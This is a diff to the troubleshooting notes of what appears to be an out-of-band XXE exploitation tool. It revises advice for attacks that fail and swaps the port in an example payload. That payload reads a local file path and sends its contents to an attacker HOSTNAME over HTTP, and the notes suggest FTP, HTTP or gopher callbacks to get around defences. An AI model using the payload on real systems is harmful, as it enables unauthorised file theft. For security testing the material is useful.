@@ -76,6 +76,7 @@ info: FTP: recvd 'RETR b'
       * External entities may be disallowed. This can be done by rejecting DOCTYPE decclarations in documents, which I believe prevents XXE injection.
       * It may also allow entities, but disallow entities from remote sources. I've seen this on some Python XML libraries.
       * Outbound traffic could be blocked at a firewall, or requests mat only go to whitelisted hosts.
-    * There could also be a type in the payload or a bug. Check the generated ``ext.dtd`` file to make sure everything looks correct. 
+    * There could also be a typo in the payload or a bug. Check the generated ``ext.dtd`` file to make sure everything looks correct. 
+    * If you get some sort of parsing error, make sure you apply URL encoding (or remove it, I dunno) to the payload. Basically make sure you have the "correct" amount of encoding.
   * The initial HTTP callback for ext.dtd works, but after that I see nothing.
-    * This could mean that FTP as a protocol is disabled server-side. Try changing the FTP callback in ``ext.dtd`` to an HTTP one, like ``<!ENTITY % bbb SYSTEM "file:///tmp/"><!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'http://HOSTNAME:2121/b'>">``. If you get a callback to the /b document, this is probably the case. Try using the gopher protocol as well, but this was removed in Java 1.6.32 (or something close).
+    * This could mean that FTP as a protocol is disabled server-side. Try changing the FTP callback in ``ext.dtd`` to an HTTP one, like ``<!ENTITY % bbb SYSTEM "file:///tmp/"><!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'http://HOSTNAME:8080/b'>">``. If you get a callback to the /b document, this is probably the case. Try using the gopher protocol as well, but this was removed in Java 1.6.32 (or something close).
